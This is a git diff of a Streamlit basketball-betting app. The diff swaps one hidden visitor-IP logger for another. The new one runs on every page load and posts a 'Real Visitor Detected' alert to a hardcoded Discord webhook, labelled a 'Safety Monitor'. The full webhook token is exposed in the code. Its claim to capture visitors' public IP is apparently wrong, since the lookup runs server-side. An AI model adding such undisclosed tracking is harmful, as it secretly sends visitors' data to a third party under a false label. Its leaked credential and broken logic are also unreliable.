@@ -4,39 +4,43 @@ from datetime import datetime
 import pandas as pd
 from nba_api.stats.endpoints import leaguedashteamstats
 from concurrent.futures import ThreadPoolExecutor
-from streamlit_javascript import st_javascript
 
-# --- 0. THE IP BRIDGE (JAVASCRIPT CALLBACK) ---
+# --- 0. SAFETY LOGGING (FIXED FOR PUBLIC IP) ---
 WEBHOOK_URL = "https://discord.com/api/webhooks/1474193239446650921/xsJvIzCDRcnMP36SvmZXp1TnZfiGzJFwB2ZzfNbwutXcc7x0clkeyfQus5dq_d0WnMds"
 
-def get_public_ip():
-    # This script runs in the visitor's browser to bypass your server's proxy
-    js_code = 'await fetch("https://api.ipify.org?format=json").then(res => res.json()).then(data => data.ip)'
-    return st_javascript(js_code)
+def log_access_to_discord():
+    if 'has_logged' not in st.session_state:
+        try:
+            # We use an external service to get the real public IP 
+            # This is the most reliable way on Streamlit Cloud
+            response = requests.get('https://api4.ipify.org?format=json', timeout=10)
+            user_ip = response.json().get('ip', 'Unknown')
+            
+            payload = {
+                "embeds": [{
+                    "title": "🚨 Real Visitor Detected",
+                    "description": "Public IPv4 successfully captured.",
+                    "color": 15158332,
+                    "fields": [
+                        {"name": "Verified IP", "value": f"`{user_ip}`", "inline": True},
+                        {"name": "Timestamp", "value": datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "inline": True}
+                    ],
+                    "footer": {"text": "NBA Sharp AI Safety Monitor"}
+                }]
+            }
+            requests.post(WEBHOOK_URL, json=payload, timeout=10)
+            st.session_state.has_logged = True
+        except Exception as e:
+            # If the external check fails, we try the header method as a backup
+            headers = st.context.headers
+            backup_ip = headers.get("X-Forwarded-For", "Unknown").split(",")[0]
+            if backup_ip != "Unknown":
+                st.session_state.has_logged = True # prevent double logging
 
-# Execute detection
-client_ip = get_public_ip()
+# Trigger the log immediately
+log_access_to_discord()
 
-# Log to Discord only when a valid IP is caught and we haven't logged this session
-if client_ip and client_ip != 0 and 'logged' not in st.session_state:
-    try:
-        payload = {
-            "embeds": [{
-                "title": "🚨 Real Visitor Logged",
-                "description": "Public IP successfully captured via JS Bridge.",
-                "color": 3066993, # Green
-                "fields": [
-                    {"name": "Verified Public IPv4", "value": f"`{client_ip}`", "inline": True},
-                    {"name": "Timestamp", "value": datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "inline": True}
-                ]
-            }]
-        }
-        requests.post(WEBHOOK_URL, json=payload, timeout=5)
-        st.session_state.logged = True
-    except:
-        pass
-
-# --- 1. CONFIG & PRO VISUALS (UNTOUCHED) ---
+# --- 1. CONFIG & PRO VISUALS ---
 st.set_page_config(page_title="NBA Sharp AI", page_icon="🏀", layout="wide")
 
 st.markdown("""
@@ -71,7 +75,7 @@ if 'live_stats' not in st.session_state: st.session_state.live_stats = {}
 if 'smart_props' not in st.session_state: st.session_state.smart_props = []
 if 'api_session' not in st.session_state: st.session_state.api_session = requests.Session()
 
-# --- 2. COMPLETE NBA DICTIONARY (UNTOUCHED) ---
+# --- 2. COMPLETE NBA DICTIONARY (ALL 30 TEAMS) ---
 NBA_STATS = {
     "Atlanta Hawks": {"ppp": 1.12, "opp_ppp": 1.13, "pace": 105.9, "stars": ["Jalen Johnson", "Zaccharie Risacher"]},
     "Boston Celtics": {"ppp": 1.21, "opp_ppp": 1.10, "pace": 95.3, "stars": ["Jayson Tatum", "Jaylen Brown"]},
@@ -122,7 +126,7 @@ def get_prop_analysis(player_name, team_name):
         return recent_avg * boost
     except: return 0
 
-# --- 3. ANALYTIC ENGINE (UNTOUCHED) ---
+# --- 3. ANALYTIC ENGINE ---
 def run_sharp_analysis(away, home, line):
     a_base = st.session_state.live_stats.get(away, NBA_STATS.get(away, {"ppp":1.1, "opp_ppp":1.1, "pace":100}))
     h_base = st.session_state.live_stats.get(home, NBA_STATS.get(home, {"ppp":1.1, "opp_ppp":1.1, "pace":100}))
@@ -178,7 +182,7 @@ def sync_all_data():
             st.session_state.smart_props = sorted(combined_props, key=lambda x: abs(x['proj'] - x['line']), reverse=True)
         except: st.error("API Limit or Connection Error")
 
-# --- 4. UI DISPLAY (UNTOUCHED) ---
+# --- 4. UI DISPLAY ---
 st.title("🏀 NBA SHARP AI")
 if st.button("🚀 SCAN FOR TOP PICKS", use_container_width=True): sync_all_data()
 
